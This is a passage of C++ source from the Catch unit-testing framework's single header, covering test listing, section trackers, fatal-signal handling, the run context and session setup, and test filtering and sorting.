		std::size_t matchedTests = 0;
		std::vector<TestCase> matchedTestCases = filterTests(getAllTestCasesSorted(config), testSpec, config);
		for (std::vector<TestCase>::const_iterator it = matchedTestCases.begin(), itEnd = matchedTestCases.end();
			it != itEnd;
			++it) {
			matchedTests++;
			TestCaseInfo const& testCaseInfo = it->getTestCaseInfo();
			Catch::cout() << testCaseInfo.name << std::endl;
		}
		return matchedTests;
	}

	struct TagInfo {
		TagInfo() : count(0) {}
		void add(std::string const& spelling) {
			++count;
			spellings.insert(spelling);
		}
		std::string all() const {
			std::string out;
			for (std::set<std::string>::const_iterator it = spellings.begin(), itEnd = spellings.end();
				it != itEnd;
				++it)
				out += "[" + *it + "]";
			return out;
		}
		std::set<std::string> spellings;
		std::size_t count;
	};

	inline std::size_t listTags(Config const& config) {
		TestSpec testSpec = config.testSpec();
		if (config.testSpec().hasFilters())
			Catch::cout() << "Tags for matching test cases:\n";
		else {
			Catch::cout() << "All available tags:\n";
			testSpec = TestSpecParser(ITagAliasRegistry::get()).parse("*").testSpec();
		}

		std::map<std::string, TagInfo> tagCounts;

		std::vector<TestCase> matchedTestCases = filterTests(getAllTestCasesSorted(config), testSpec, config);
		for (std::vector<TestCase>::const_iterator it = matchedTestCases.begin(), itEnd = matchedTestCases.end();
			it != itEnd;
			++it) {
			for (std::set<std::string>::const_iterator  tagIt = it->getTestCaseInfo().tags.begin(),
				tagItEnd = it->getTestCaseInfo().tags.end();
				tagIt != tagItEnd;
				++tagIt) {
				std::string tagName = *tagIt;
				std::string lcaseTagName = toLower(tagName);
				std::map<std::string, TagInfo>::iterator countIt = tagCounts.find(lcaseTagName);
				if (countIt == tagCounts.end())
					countIt = tagCounts.insert(std::make_pair(lcaseTagName, TagInfo())).first;
				countIt->second.add(tagName);
			}
		}

		for (std::map<std::string, TagInfo>::const_iterator countIt = tagCounts.begin(),
			countItEnd = tagCounts.end();
			countIt != countItEnd;
			++countIt) {
			std::ostringstream oss;
			oss << "  " << std::setw(2) << countIt->second.count << "  ";
			Text wrapper(countIt->second.all(), TextAttributes()
				.setInitialIndent(0)
				.setIndent(oss.str().size())
				.setWidth(CATCH_CONFIG_CONSOLE_WIDTH - 10));
			Catch::cout() << oss.str() << wrapper << "\n";
		}
		Catch::cout() << pluralise(tagCounts.size(), "tag") << "\n" << std::endl;
		return tagCounts.size();
	}

	inline std::size_t listReporters(Config const& /*config*/) {
		Catch::cout() << "Available reporters:\n";
		IReporterRegistry::FactoryMap const& factories = getRegistryHub().getReporterRegistry().getFactories();
		IReporterRegistry::FactoryMap::const_iterator itBegin = factories.begin(), itEnd = factories.end(), it;
		std::size_t maxNameLen = 0;
		for (it = itBegin; it != itEnd; ++it)
			maxNameLen = (std::max)(maxNameLen, it->first.size());

		for (it = itBegin; it != itEnd; ++it) {
			Text wrapper(it->second->getDescription(), TextAttributes()
				.setInitialIndent(0)
				.setIndent(7 + maxNameLen)
				.setWidth(CATCH_CONFIG_CONSOLE_WIDTH - maxNameLen - 8));
			Catch::cout() << "  "
				<< it->first
				<< ":"
				<< std::string(maxNameLen - it->first.size() + 2, ' ')
				<< wrapper << "\n";
		}
		Catch::cout() << std::endl;
		return factories.size();
	}

	inline Option<std::size_t> list(Config const& config) {
		Option<std::size_t> listedCount;
		if (config.listTests())
			listedCount = listedCount.valueOr(0) + listTests(config);
		if (config.listTestNamesOnly())
			listedCount = listedCount.valueOr(0) + listTestsNamesOnly(config);
		if (config.listTags())
			listedCount = listedCount.valueOr(0) + listTags(config);
		if (config.listReporters())
			listedCount = listedCount.valueOr(0) + listReporters(config);
		return listedCount;
	}

} // end namespace Catch

  // #included from: internal/catch_run_context.hpp
#define TWOBLUECUBES_CATCH_RUNNER_IMPL_HPP_INCLUDED

  // #included from: catch_test_case_tracker.hpp
#define TWOBLUECUBES_CATCH_TEST_CASE_TRACKER_HPP_INCLUDED

#include <map>
#include <string>
#include <assert.h>
#include <vector>

namespace Catch {
	namespace TestCaseTracking {

		struct ITracker : SharedImpl<> {
			virtual ~ITracker();

			// static queries
			virtual std::string name() const = 0;

			// dynamic queries
			virtual bool isComplete() const = 0; // Successfully completed or failed
			virtual bool isSuccessfullyCompleted() const = 0;
			virtual bool isOpen() const = 0; // Started but not complete
			virtual bool hasChildren() const = 0;

			virtual ITracker& parent() = 0;

			// actions
			virtual void close() = 0; // Successfully complete
			virtual void fail() = 0;
			virtual void markAsNeedingAnotherRun() = 0;

			virtual void addChild(Ptr<ITracker> const& child) = 0;
			virtual ITracker* findChild(std::string const& name) = 0;
			virtual void openChild() = 0;

			// Debug/ checking
			virtual bool isSectionTracker() const = 0;
			virtual bool isIndexTracker() const = 0;
		};

		class TrackerContext {

			enum RunState {
				NotStarted,
				Executing,
				CompletedCycle
			};

			Ptr<ITracker> m_rootTracker;
			ITracker* m_currentTracker;
			RunState m_runState;

		public:

			static TrackerContext& instance() {
				static TrackerContext s_instance;
				return s_instance;
			}

			TrackerContext()
				: m_currentTracker(CATCH_NULL),
				m_runState(NotStarted)
			{}

			ITracker& startRun();

			void endRun() {
				m_rootTracker.reset();
				m_currentTracker = CATCH_NULL;
				m_runState = NotStarted;
			}

			void startCycle() {
				m_currentTracker = m_rootTracker.get();
				m_runState = Executing;
			}
			void completeCycle() {
				m_runState = CompletedCycle;
			}

			bool completedCycle() const {
				return m_runState == CompletedCycle;
			}
			ITracker& currentTracker() {
				return *m_currentTracker;
			}
			void setCurrentTracker(ITracker* tracker) {
				m_currentTracker = tracker;
			}
		};

		class TrackerBase : public ITracker {
		protected:
			enum CycleState {
				NotStarted,
				Executing,
				ExecutingChildren,
				NeedsAnotherRun,
				CompletedSuccessfully,
				Failed
			};
			class TrackerHasName {
				std::string m_name;
			public:
				TrackerHasName(std::string const& name) : m_name(name) {}
				bool operator ()(Ptr<ITracker> const& tracker) {
					return tracker->name() == m_name;
				}
			};
			typedef std::vector<Ptr<ITracker> > Children;
			std::string m_name;
			TrackerContext& m_ctx;
			ITracker* m_parent;
			Children m_children;
			CycleState m_runState;
		public:
			TrackerBase(std::string const& name, TrackerContext& ctx, ITracker* parent)
				: m_name(name),
				m_ctx(ctx),
				m_parent(parent),
				m_runState(NotStarted)
			{}
			virtual ~TrackerBase();

			virtual std::string name() const CATCH_OVERRIDE {
				return m_name;
			}
			virtual bool isComplete() const CATCH_OVERRIDE {
				return m_runState == CompletedSuccessfully || m_runState == Failed;
			}
			virtual bool isSuccessfullyCompleted() const CATCH_OVERRIDE {
				return m_runState == CompletedSuccessfully;
			}
			virtual bool isOpen() const CATCH_OVERRIDE {
				return m_runState != NotStarted && !isComplete();
			}
			virtual bool hasChildren() const CATCH_OVERRIDE {
				return !m_children.empty();
			}

			virtual void addChild(Ptr<ITracker> const& child) CATCH_OVERRIDE {
				m_children.push_back(child);
			}

			virtual ITracker* findChild(std::string const& name) CATCH_OVERRIDE {
				Children::const_iterator it = std::find_if(m_children.begin(), m_children.end(), TrackerHasName(name));
				return(it != m_children.end())
					? it->get()
					: CATCH_NULL;
			}
			virtual ITracker& parent() CATCH_OVERRIDE {
				assert(m_parent); // Should always be non-null except for root
				return *m_parent;
			}

			virtual void openChild() CATCH_OVERRIDE {
				if (m_runState != ExecutingChildren) {
					m_runState = ExecutingChildren;
					if (m_parent)
						m_parent->openChild();
				}
			}

			virtual bool isSectionTracker() const CATCH_OVERRIDE { return false; }
			virtual bool isIndexTracker() const CATCH_OVERRIDE { return false; }

			void open() {
				m_runState = Executing;
				moveToThis();
				if (m_parent)
					m_parent->openChild();
			}

			virtual void close() CATCH_OVERRIDE {

				// Close any still open children (e.g. generators)
				while (&m_ctx.currentTracker() != this)
					m_ctx.currentTracker().close();

				switch (m_runState) {
				case NotStarted:
				case CompletedSuccessfully:
				case Failed:
					throw std::logic_error("Illogical state");

				case NeedsAnotherRun:
					break;;

				case Executing:
					m_runState = CompletedSuccessfully;
					break;
				case ExecutingChildren:
					if (m_children.empty() || m_children.back()->isComplete())
						m_runState = CompletedSuccessfully;
					break;

				default:
					throw std::logic_error("Unexpected state");
				}
				moveToParent();
				m_ctx.completeCycle();
			}
			virtual void fail() CATCH_OVERRIDE {
				m_runState = Failed;
				if (m_parent)
					m_parent->markAsNeedingAnotherRun();
				moveToParent();
				m_ctx.completeCycle();
			}
			virtual void markAsNeedingAnotherRun() CATCH_OVERRIDE {
				m_runState = NeedsAnotherRun;
			}
		private:
			void moveToParent() {
				assert(m_parent);
				m_ctx.setCurrentTracker(m_parent);
			}
			void moveToThis() {
				m_ctx.setCurrentTracker(this);
			}
		};

		class SectionTracker : public TrackerBase {
		public:
			SectionTracker(std::string const& name, TrackerContext& ctx, ITracker* parent)
				: TrackerBase(name, ctx, parent)
			{}
			virtual ~SectionTracker();

			virtual bool isSectionTracker() const CATCH_OVERRIDE { return true; }

			static SectionTracker& acquire(TrackerContext& ctx, std::string const& name) {
				SectionTracker* section = CATCH_NULL;

				ITracker& currentTracker = ctx.currentTracker();
				if (ITracker* childTracker = currentTracker.findChild(name)) {
					assert(childTracker);
					assert(childTracker->isSectionTracker());
					section = static_cast<SectionTracker*>(childTracker);
				}
				else {
					section = new SectionTracker(name, ctx, &currentTracker);
					currentTracker.addChild(section);
				}
				if (!ctx.completedCycle() && !section->isComplete()) {

					section->open();
				}
				return *section;
			}
		};

		class IndexTracker : public TrackerBase {
			int m_size;
			int m_index;
		public:
			IndexTracker(std::string const& name, TrackerContext& ctx, ITracker* parent, int size)
				: TrackerBase(name, ctx, parent),
				m_size(size),
				m_index(-1)
			{}
			virtual ~IndexTracker();

			virtual bool isIndexTracker() const CATCH_OVERRIDE { return true; }

			static IndexTracker& acquire(TrackerContext& ctx, std::string const& name, int size) {
				IndexTracker* tracker = CATCH_NULL;

				ITracker& currentTracker = ctx.currentTracker();
				if (ITracker* childTracker = currentTracker.findChild(name)) {
					assert(childTracker);
					assert(childTracker->isIndexTracker());
					tracker = static_cast<IndexTracker*>(childTracker);
				}
				else {
					tracker = new IndexTracker(name, ctx, &currentTracker, size);
					currentTracker.addChild(tracker);
				}

				if (!ctx.completedCycle() && !tracker->isComplete()) {
					if (tracker->m_runState != ExecutingChildren && tracker->m_runState != NeedsAnotherRun)
						tracker->moveNext();
					tracker->open();
				}

				return *tracker;
			}

			int index() const { return m_index; }

			void moveNext() {
				m_index++;
				m_children.clear();
			}

			virtual void close() CATCH_OVERRIDE {
				TrackerBase::close();
				if (m_runState == CompletedSuccessfully && m_index < m_size - 1)
					m_runState = Executing;
			}
		};

		inline ITracker& TrackerContext::startRun() {
			m_rootTracker = new SectionTracker("{root}", *this, CATCH_NULL);
			m_currentTracker = CATCH_NULL;
			m_runState = Executing;
			return *m_rootTracker;
		}

	} // namespace TestCaseTracking

	using TestCaseTracking::ITracker;
	using TestCaseTracking::TrackerContext;
	using TestCaseTracking::SectionTracker;
	using TestCaseTracking::IndexTracker;

} // namespace Catch

  // #included from: catch_fatal_condition.hpp
#define TWOBLUECUBES_CATCH_FATAL_CONDITION_H_INCLUDED

namespace Catch {

	// Report the error condition then exit the process
	inline void fatal(std::string const& message, int exitCode) {
		IContext& context = Catch::getCurrentContext();
		IResultCapture* resultCapture = context.getResultCapture();
		resultCapture->handleFatalErrorCondition(message);

		if (Catch::alwaysTrue()) // avoids "no return" warnings
			exit(exitCode);
	}

} // namespace Catch

#if defined ( CATCH_PLATFORM_WINDOWS ) /////////////////////////////////////////

namespace Catch {

	struct FatalConditionHandler {
		void reset() {}
	};

} // namespace Catch

#else // Not Windows - assumed to be POSIX compatible //////////////////////////

#include <signal.h>

namespace Catch {

	struct SignalDefs { int id; const char* name; };
	extern SignalDefs signalDefs[];
	SignalDefs signalDefs[] = {
		{ SIGINT,  "SIGINT - Terminal interrupt signal" },
		{ SIGILL,  "SIGILL - Illegal instruction signal" },
		{ SIGFPE,  "SIGFPE - Floating point error signal" },
		{ SIGSEGV, "SIGSEGV - Segmentation violation signal" },
		{ SIGTERM, "SIGTERM - Termination request signal" },
		{ SIGABRT, "SIGABRT - Abort (abnormal termination) signal" }
	};

	struct FatalConditionHandler {

		static void handleSignal(int sig) {
			for (std::size_t i = 0; i < sizeof(signalDefs) / sizeof(SignalDefs); ++i)
				if (sig == signalDefs[i].id)
					fatal(signalDefs[i].name, -sig);
			fatal("<unknown signal>", -sig);
		}

		FatalConditionHandler() : m_isSet(true) {
			for (std::size_t i = 0; i < sizeof(signalDefs) / sizeof(SignalDefs); ++i)
				signal(signalDefs[i].id, handleSignal);
		}
		~FatalConditionHandler() {
			reset();
		}
		void reset() {
			if (m_isSet) {
				for (std::size_t i = 0; i < sizeof(signalDefs) / sizeof(SignalDefs); ++i)
					signal(signalDefs[i].id, SIG_DFL);
				m_isSet = false;
			}
		}

		bool m_isSet;
	};

} // namespace Catch

#endif // not Windows

#include <set>
#include <string>

namespace Catch {

	class StreamRedirect {

	public:
		StreamRedirect(std::ostream& stream, std::string& targetString)
			: m_stream(stream),
			m_prevBuf(stream.rdbuf()),
			m_targetString(targetString)
		{
			stream.rdbuf(m_oss.rdbuf());
		}

		~StreamRedirect() {
			m_targetString += m_oss.str();
			m_stream.rdbuf(m_prevBuf);
		}

	private:
		std::ostream& m_stream;
		std::streambuf* m_prevBuf;
		std::ostringstream m_oss;
		std::string& m_targetString;
	};

	///////////////////////////////////////////////////////////////////////////

	class RunContext : public IResultCapture, public IRunner {

		RunContext(RunContext const&);
		void operator =(RunContext const&);

	public:

		explicit RunContext(Ptr<IConfig const> const& _config, Ptr<IStreamingReporter> const& reporter)
			: m_runInfo(_config->name()),
			m_context(getCurrentMutableContext()),
			m_activeTestCase(CATCH_NULL),
			m_config(_config),
			m_reporter(reporter)
		{
			m_context.setRunner(this);
			m_context.setConfig(m_config);
			m_context.setResultCapture(this);
			m_reporter->testRunStarting(m_runInfo);
		}

		virtual ~RunContext() {
			m_reporter->testRunEnded(TestRunStats(m_runInfo, m_totals, aborting()));
		}

		void testGroupStarting(std::string const& testSpec, std::size_t groupIndex, std::size_t groupsCount) {
			m_reporter->testGroupStarting(GroupInfo(testSpec, groupIndex, groupsCount));
		}
		void testGroupEnded(std::string const& testSpec, Totals const& totals, std::size_t groupIndex, std::size_t groupsCount) {
			m_reporter->testGroupEnded(TestGroupStats(GroupInfo(testSpec, groupIndex, groupsCount), totals, aborting()));
		}

		Totals runTest(TestCase const& testCase) {
			Totals prevTotals = m_totals;

			std::string redirectedCout;
			std::string redirectedCerr;

			TestCaseInfo testInfo = testCase.getTestCaseInfo();

			m_reporter->testCaseStarting(testInfo);

			m_activeTestCase = &testCase;

			do {
				m_trackerContext.startRun();
				do {
					m_trackerContext.startCycle();
					m_testCaseTracker = &SectionTracker::acquire(m_trackerContext, testInfo.name);
					runCurrentTest(redirectedCout, redirectedCerr);
				} while (!m_testCaseTracker->isSuccessfullyCompleted() && !aborting());
			}
			// !TBD: deprecated - this will be replaced by indexed trackers
			while (getCurrentContext().advanceGeneratorsForCurrentTest() && !aborting());

			Totals deltaTotals = m_totals.delta(prevTotals);
			if (testInfo.expectedToFail() && deltaTotals.testCases.passed > 0) {
				deltaTotals.assertions.failed++;
				deltaTotals.testCases.passed--;
				deltaTotals.testCases.failed++;
			}
			m_totals.testCases += deltaTotals.testCases;
			m_reporter->testCaseEnded(TestCaseStats(testInfo,
				deltaTotals,
				redirectedCout,
				redirectedCerr,
				aborting()));

			m_activeTestCase = CATCH_NULL;
			m_testCaseTracker = CATCH_NULL;

			return deltaTotals;
		}

		Ptr<IConfig const> config() const {
			return m_config;
		}

	private: // IResultCapture

		virtual void assertionEnded(AssertionResult const& result) {
			if (result.getResultType() == ResultWas::Ok) {
				m_totals.assertions.passed++;
			}
			else if (!result.isOk()) {
				m_totals.assertions.failed++;
			}

			if (m_reporter->assertionEnded(AssertionStats(result, m_messages, m_totals)))
				m_messages.clear();

			// Reset working state
			m_lastAssertionInfo = AssertionInfo("", m_lastAssertionInfo.lineInfo, "{Unknown expression after the reported line}", m_lastAssertionInfo.resultDisposition);
			m_lastResult = result;
		}

		virtual bool sectionStarted(
			SectionInfo const& sectionInfo,
			Counts& assertions
		)
		{
			std::ostringstream oss;
			oss << sectionInfo.name << "@" << sectionInfo.lineInfo;

			ITracker& sectionTracker = SectionTracker::acquire(m_trackerContext, oss.str());
			if (!sectionTracker.isOpen())
				return false;
			m_activeSections.push_back(&sectionTracker);

			m_lastAssertionInfo.lineInfo = sectionInfo.lineInfo;

			m_reporter->sectionStarting(sectionInfo);

			assertions = m_totals.assertions;

			return true;
		}
		bool testForMissingAssertions(Counts& assertions) {
			if (assertions.total() != 0)
				return false;
			if (!m_config->warnAboutMissingAssertions())
				return false;
			if (m_trackerContext.currentTracker().hasChildren())
				return false;
			m_totals.assertions.failed++;
			assertions.failed++;
			return true;
		}

		virtual void sectionEnded(SectionEndInfo const& endInfo) {
			Counts assertions = m_totals.assertions - endInfo.prevAssertions;
			bool missingAssertions = testForMissingAssertions(assertions);

			if (!m_activeSections.empty()) {
				m_activeSections.back()->close();
				m_activeSections.pop_back();
			}

			m_reporter->sectionEnded(SectionStats(endInfo.sectionInfo, assertions, endInfo.durationInSeconds, missingAssertions));
			m_messages.clear();
		}

		virtual void sectionEndedEarly(SectionEndInfo const& endInfo) {
			if (m_unfinishedSections.empty())
				m_activeSections.back()->fail();
			else
				m_activeSections.back()->close();
			m_activeSections.pop_back();

			m_unfinishedSections.push_back(endInfo);
		}

		virtual void pushScopedMessage(MessageInfo const& message) {
			m_messages.push_back(message);
		}

		virtual void popScopedMessage(MessageInfo const& message) {
			m_messages.erase(std::remove(m_messages.begin(), m_messages.end(), message), m_messages.end());
		}

		virtual std::string getCurrentTestName() const {
			return m_activeTestCase
				? m_activeTestCase->getTestCaseInfo().name
				: "";
		}

		virtual const AssertionResult* getLastResult() const {
			return &m_lastResult;
		}

		virtual void handleFatalErrorCondition(std::string const& message) {
			ResultBuilder resultBuilder = makeUnexpectedResultBuilder();
			resultBuilder.setResultType(ResultWas::FatalErrorCondition);
			resultBuilder << message;
			resultBuilder.captureExpression();

			handleUnfinishedSections();

			// Recreate section for test case (as we will lose the one that was in scope)
			TestCaseInfo const& testCaseInfo = m_activeTestCase->getTestCaseInfo();
			SectionInfo testCaseSection(testCaseInfo.lineInfo, testCaseInfo.name, testCaseInfo.description);

			Counts assertions;
			assertions.failed = 1;
			SectionStats testCaseSectionStats(testCaseSection, assertions, 0, false);
			m_reporter->sectionEnded(testCaseSectionStats);

			TestCaseInfo testInfo = m_activeTestCase->getTestCaseInfo();

			Totals deltaTotals;
			deltaTotals.testCases.failed = 1;
			m_reporter->testCaseEnded(TestCaseStats(testInfo,
				deltaTotals,
				"",
				"",
				false));
			m_totals.testCases.failed++;
			testGroupEnded("", m_totals, 1, 1);
			m_reporter->testRunEnded(TestRunStats(m_runInfo, m_totals, false));
		}

	public:
		// !TBD We need to do this another way!
		bool aborting() const {
			return m_totals.assertions.failed == static_cast<std::size_t>(m_config->abortAfter());
		}

	private:

		void runCurrentTest(std::string& redirectedCout, std::string& redirectedCerr) {
			TestCaseInfo const& testCaseInfo = m_activeTestCase->getTestCaseInfo();
			SectionInfo testCaseSection(testCaseInfo.lineInfo, testCaseInfo.name, testCaseInfo.description);
			m_reporter->sectionStarting(testCaseSection);
			Counts prevAssertions = m_totals.assertions;
			double duration = 0;
			try {
				m_lastAssertionInfo = AssertionInfo("TEST_CASE", testCaseInfo.lineInfo, "", ResultDisposition::Normal);

				seedRng(*m_config);

				Timer timer;
				timer.start();
				if (m_reporter->getPreferences().shouldRedirectStdOut) {
					StreamRedirect coutRedir(Catch::cout(), redirectedCout);
					StreamRedirect cerrRedir(Catch::cerr(), redirectedCerr);
					invokeActiveTestCase();
				}
				else {
					invokeActiveTestCase();
				}
				duration = timer.getElapsedSeconds();
			}
			catch (TestFailureException&) {
				// This just means the test was aborted due to failure
			}
			catch (...) {
				makeUnexpectedResultBuilder().useActiveException();
			}
			m_testCaseTracker->close();
			handleUnfinishedSections();
			m_messages.clear();

			Counts assertions = m_totals.assertions - prevAssertions;
			bool missingAssertions = testForMissingAssertions(assertions);

			if (testCaseInfo.okToFail()) {
				std::swap(assertions.failedButOk, assertions.failed);
				m_totals.assertions.failed -= assertions.failedButOk;
				m_totals.assertions.failedButOk += assertions.failedButOk;
			}

			SectionStats testCaseSectionStats(testCaseSection, assertions, duration, missingAssertions);
			m_reporter->sectionEnded(testCaseSectionStats);
		}

		void invokeActiveTestCase() {
			FatalConditionHandler fatalConditionHandler; // Handle signals
			m_activeTestCase->invoke();
			fatalConditionHandler.reset();
		}

	private:

		ResultBuilder makeUnexpectedResultBuilder() const {
			return ResultBuilder(m_lastAssertionInfo.macroName.c_str(),
				m_lastAssertionInfo.lineInfo,
				m_lastAssertionInfo.capturedExpression.c_str(),
				m_lastAssertionInfo.resultDisposition);
		}

		void handleUnfinishedSections() {
			// If sections ended prematurely due to an exception we stored their
			// infos here so we can tear them down outside the unwind process.
			for (std::vector<SectionEndInfo>::const_reverse_iterator it = m_unfinishedSections.rbegin(),
				itEnd = m_unfinishedSections.rend();
				it != itEnd;
				++it)
				sectionEnded(*it);
			m_unfinishedSections.clear();
		}

		TestRunInfo m_runInfo;
		IMutableContext& m_context;
		TestCase const* m_activeTestCase;
		ITracker* m_testCaseTracker;
		ITracker* m_currentSectionTracker;
		AssertionResult m_lastResult;

		Ptr<IConfig const> m_config;
		Totals m_totals;
		Ptr<IStreamingReporter> m_reporter;
		std::vector<MessageInfo> m_messages;
		AssertionInfo m_lastAssertionInfo;
		std::vector<SectionEndInfo> m_unfinishedSections;
		std::vector<ITracker*> m_activeSections;
		TrackerContext m_trackerContext;
	};

	IResultCapture& getResultCapture() {
		if (IResultCapture* capture = getCurrentContext().getResultCapture())
			return *capture;
		else
			throw std::logic_error("No result capture instance");
	}

} // end namespace Catch

  // #included from: internal/catch_version.h
#define TWOBLUECUBES_CATCH_VERSION_H_INCLUDED

namespace Catch {

	// Versioning information
	struct Version {
		Version(unsigned int _majorVersion,
			unsigned int _minorVersion,
			unsigned int _patchNumber,
			std::string const& _branchName,
			unsigned int _buildNumber);

		unsigned int const majorVersion;
		unsigned int const minorVersion;
		unsigned int const patchNumber;

		// buildNumber is only used if branchName is not null
		std::string const branchName;
		unsigned int const buildNumber;

		friend std::ostream& operator << (std::ostream& os, Version const& version);

	private:
		void operator=(Version const&);
	};

	extern Version libraryVersion;
}

#include <fstream>
#include <stdlib.h>
#include <limits>

namespace Catch {

	Ptr<IStreamingReporter> createReporter(std::string const& reporterName, Ptr<Config> const& config) {
		Ptr<IStreamingReporter> reporter = getRegistryHub().getReporterRegistry().create(reporterName, config.get());
		if (!reporter) {
			std::ostringstream oss;
			oss << "No reporter registered with name: '" << reporterName << "'";
			throw std::domain_error(oss.str());
		}
		return reporter;
	}

	Ptr<IStreamingReporter> makeReporter(Ptr<Config> const& config) {
		std::vector<std::string> reporters = config->getReporterNames();
		if (reporters.empty())
			reporters.push_back("console");

		Ptr<IStreamingReporter> reporter;
		for (std::vector<std::string>::const_iterator it = reporters.begin(), itEnd = reporters.end();
			it != itEnd;
			++it)
			reporter = addReporter(reporter, createReporter(*it, config));
		return reporter;
	}
	Ptr<IStreamingReporter> addListeners(Ptr<IConfig const> const& config, Ptr<IStreamingReporter> reporters) {
		IReporterRegistry::Listeners listeners = getRegistryHub().getReporterRegistry().getListeners();
		for (IReporterRegistry::Listeners::const_iterator it = listeners.begin(), itEnd = listeners.end();
			it != itEnd;
			++it)
			reporters = addReporter(reporters, (*it)->create(ReporterConfig(config)));
		return reporters;
	}

	Totals runTests(Ptr<Config> const& config) {

		Ptr<IConfig const> iconfig = config.get();

		Ptr<IStreamingReporter> reporter = makeReporter(config);
		reporter = addListeners(iconfig, reporter);

		RunContext context(iconfig, reporter);

		Totals totals;

		context.testGroupStarting(config->name(), 1, 1);

		TestSpec testSpec = config->testSpec();
		if (!testSpec.hasFilters())
			testSpec = TestSpecParser(ITagAliasRegistry::get()).parse("~[.]").testSpec(); // All not hidden tests

		std::vector<TestCase> const& allTestCases = getAllTestCasesSorted(*iconfig);
		for (std::vector<TestCase>::const_iterator it = allTestCases.begin(), itEnd = allTestCases.end();
			it != itEnd;
			++it) {
			if (!context.aborting() && matchTest(*it, testSpec, *iconfig))
				totals += context.runTest(*it);
			else
				reporter->skipTest(*it);
		}

		context.testGroupEnded(iconfig->name(), totals, 1, 1);
		return totals;
	}

	void applyFilenamesAsTags(IConfig const& config) {
		std::vector<TestCase> const& tests = getAllTestCasesSorted(config);
		for (std::size_t i = 0; i < tests.size(); ++i) {
			TestCase& test = const_cast<TestCase&>(tests[i]);
			std::set<std::string> tags = test.tags;

			std::string filename = test.lineInfo.file;
			std::string::size_type lastSlash = filename.find_last_of("\\/");
			if (lastSlash != std::string::npos)
				filename = filename.substr(lastSlash + 1);

			std::string::size_type lastDot = filename.find_last_of(".");
			if (lastDot != std::string::npos)
				filename = filename.substr(0, lastDot);

			tags.insert("#" + filename);
			setTags(test, tags);
		}
	}

	class Session : NonCopyable {
		static bool alreadyInstantiated;

	public:

		struct OnUnusedOptions { enum DoWhat { Ignore, Fail }; };

		Session()
			: m_cli(makeCommandLineParser()) {
			if (alreadyInstantiated) {
				std::string msg = "Only one instance of Catch::Session can ever be used";
				Catch::cerr() << msg << std::endl;
				throw std::logic_error(msg);
			}
			alreadyInstantiated = true;
		}
		~Session() {
			Catch::cleanUp();
		}

		void showHelp(std::string const& processName) {
			Catch::cout() << "\nCatch v" << libraryVersion << "\n";

			m_cli.usage(Catch::cout(), processName);
			Catch::cout() << "For more detail usage please see the project docs\n" << std::endl;
		}

		int applyCommandLine(int argc, char const* const* const argv, OnUnusedOptions::DoWhat unusedOptionBehaviour = OnUnusedOptions::Fail) {
			try {
				m_cli.setThrowOnUnrecognisedTokens(unusedOptionBehaviour == OnUnusedOptions::Fail);
				m_unusedTokens = m_cli.parseInto(Clara::argsToVector(argc, argv), m_configData);
				if (m_configData.showHelp)
					showHelp(m_configData.processName);
				m_config.reset();
			}
			catch (std::exception& ex) {
				{
					Colour colourGuard(Colour::Red);
					Catch::cerr()
						<< "\nError(s) in input:\n"
						<< Text(ex.what(), TextAttributes().setIndent(2))
						<< "\n\n";
				}
				m_cli.usage(Catch::cout(), m_configData.processName);
				return (std::numeric_limits<int>::max)();
			}
			return 0;
		}

		void useConfigData(ConfigData const& _configData) {
			m_configData = _configData;
			m_config.reset();
		}

		int run(int argc, char const* const* const argv) {

			int returnCode = applyCommandLine(argc, argv);
			if (returnCode == 0)
				returnCode = run();
			return returnCode;
		}

		int run() {
			if (m_configData.showHelp)
				return 0;

			try
			{
				config(); // Force config to be constructed

				seedRng(*m_config);

				if (m_configData.filenamesAsTags)
					applyFilenamesAsTags(*m_config);

				// Handle list request
				if (Option<std::size_t> listed = list(config()))
					return static_cast<int>(*listed);

				return static_cast<int>(runTests(m_config).assertions.failed);
			}
			catch (std::exception& ex) {
				Catch::cerr() << ex.what() << std::endl;
				return (std::numeric_limits<int>::max)();
			}
		}

		Clara::CommandLine<ConfigData> const& cli() const {
			return m_cli;
		}
		std::vector<Clara::Parser::Token> const& unusedTokens() const {
			return m_unusedTokens;
		}
		ConfigData& configData() {
			return m_configData;
		}
		Config& config() {
			if (!m_config)
				m_config = new Config(m_configData);
			return *m_config;
		}
	private:
		Clara::CommandLine<ConfigData> m_cli;
		std::vector<Clara::Parser::Token> m_unusedTokens;
		ConfigData m_configData;
		Ptr<Config> m_config;
	};

	bool Session::alreadyInstantiated = false;

} // end namespace Catch

  // #included from: catch_registry_hub.hpp
#define TWOBLUECUBES_CATCH_REGISTRY_HUB_HPP_INCLUDED

  // #included from: catch_test_case_registry_impl.hpp
#define TWOBLUECUBES_CATCH_TEST_CASE_REGISTRY_IMPL_HPP_INCLUDED

#include <vector>
#include <set>
#include <sstream>
#include <iostream>
#include <algorithm>

namespace Catch {

	struct LexSort {
		bool operator() (TestCase i, TestCase j) const { return (i<j); }
	};
	struct RandomNumberGenerator {
		int operator()(int n) const { return std::rand() % n; }
	};

	inline std::vector<TestCase> sortTests(IConfig const& config, std::vector<TestCase> const& unsortedTestCases) {

		std::vector<TestCase> sorted = unsortedTestCases;

		switch (config.runOrder()) {
		case RunTests::InLexicographicalOrder:
			std::sort(sorted.begin(), sorted.end(), LexSort());
			break;
		case RunTests::InRandomOrder:
		{
			seedRng(config);

			RandomNumberGenerator rng;
			std::random_shuffle(sorted.begin(), sorted.end(), rng);
		}
		break;
		case RunTests::InDeclarationOrder:
			// already in declaration order
			break;
		}
		return sorted;
	}
	bool matchTest(TestCase const& testCase, TestSpec const& testSpec, IConfig const& config) {
		return testSpec.matches(testCase) && (config.allowThrows() || !testCase.throws());
	}

	void enforceNoDuplicateTestCases(std::vector<TestCase> const& functions) {
		std::set<TestCase> seenFunctions;
		for (std::vector<TestCase>::const_iterator it = functions.begin(), itEnd = functions.end();
			it != itEnd;
			++it) {
			std::pair<std::set<TestCase>::const_iterator, bool> prev = seenFunctions.insert(*it);
			if (!prev.second) {
				Catch::cerr()
					<< Colour(Colour::Red)
					<< "error: TEST_CASE( \"" << it->name << "\" ) already defined.\n"
					<< "\tFirst seen at " << prev.first->getTestCaseInfo().lineInfo << "\n"
					<< "\tRedefined at " << it->getTestCaseInfo().lineInfo << std::endl;
				exit(1);
			}
		}
	}

	std::vector<TestCase> filterTests(std::vector<TestCase> const& testCases, TestSpec const& testSpec, IConfig const& config) {
		std::vector<TestCase> filtered;
		filtered.reserve(testCases.size());
		for (std::vector<TestCase>::const_iterator it = testCases.begin(), itEnd = testCases.end();
			it != itEnd;
			++it)
			if (matchTest(*it, testSpec, config))
				filtered.push_back(*it);
		return filtered;
	}
